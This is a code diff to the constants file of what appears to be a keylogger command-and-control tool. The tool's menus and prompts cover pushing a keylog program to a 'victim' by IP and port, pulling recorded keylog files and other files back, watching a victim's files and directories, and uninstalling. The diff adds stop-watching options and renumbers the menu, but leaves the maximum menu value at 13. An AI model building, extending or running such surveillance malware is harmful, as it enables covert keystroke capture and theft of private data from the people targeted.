@@ -31,9 +31,11 @@ MENU_ITEM_SEVEN = "7 - Get a file from a Victim"
 MENU_ITEM_EIGHT = "8 - Run program"
 MENU_ITEM_NINE = "9 - Watch file"
 MENU_ITEM_TEN = "10 - Watch directory"
-MENU_ITEM_ELEVEN = "11 - Get List of All Connected Victim(s)"
-MENU_ITEM_TWELVE = "12 - Connect to a Specific Victim"
-MENU_ITEM_THIRTEEN = "13 - Uninstall"
+MENU_ITEM_ELEVEN = "11 - Stop Watching File"
+MENU_ITEM_TWELVE = "12 - Stop Watching Directory"
+MENU_ITEM_THIRTEEN = "13 - Get List of All Connected Victim(s)"
+MENU_ITEM_FOURTEEN = "14 - Connect to a Specific Victim"
+MENU_ITEM_FIFTEEN = "15 - Uninstall"
 PERFORM_MENU_ITEM_ONE = 1
 PERFORM_MENU_ITEM_TWO = 2
 PERFORM_MENU_ITEM_THREE = 3
@@ -47,6 +49,8 @@ PERFORM_MENU_ITEM_TEN = 10
 PERFORM_MENU_ITEM_ELEVEN = 11
 PERFORM_MENU_ITEM_TWELVE = 12
 PERFORM_MENU_ITEM_THIRTEEN = 13
+PERFORM_MENU_ITEM_FOURTEEN = 14
+PERFORM_MENU_ITEM_FIFTEEN = 15
 MIN_MENU_ITEM_VALUE = 1
 MAX_MENU_ITEM_VALUE = 13
 BYTE_LIMIT = 1024
@@ -113,7 +117,7 @@ RECEIVED_CONFIRMATION_MSG = "OK"
 FILE_NAME_TRANSFER_MSG = "[+] Sending file: {}"
 FILE_TRANSFER_SUCCESSFUL = "[+] FILE TRANSFER SUCCESSFUL: '{}' has been sent successfully to victim (IP: {} Port: {})"
 FILE_TRANSFER_ERROR = "[+] ERROR: An error has occurred during file transfer : {}"
-END_OF_FILE_SIGNAL = b"END_OF_FILE"
+END_OF_FILE_SIGNAL = b"EOF"
 VICTIM_ACK = "ACK"
 TARGET_VICTIM_NOT_FOUND = "[+] ERROR: Target victim not found!"
 ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer keylog program to: "
@@ -143,6 +147,11 @@ WRITE_BINARY_MODE = "wb"
 TRANSFER_SUCCESS_MSG = "[+] FILE TRANSFER SUCCESSFUL: {} has been transferred successfully!"
 ENTER_TARGET_IP_GET_FILES = "[+] Enter the target (victim) IP address to receive recorded keylog files from: "
 ENTER_TARGET_PORT_GET_FILES = "[+] Enter the target (victim) port to receive recorded keylog files from: "
+
+
+# MENU ITEM 9 - Watch File
+START_WATCH_FILE_MSG = "[+] [MENU ITEM 9] - Now Watching File"
+WATCH_FILE_SIGNAL = "WATCH FILE"
 
 
 # MENU ITEM 12 - Connect to a specific victim
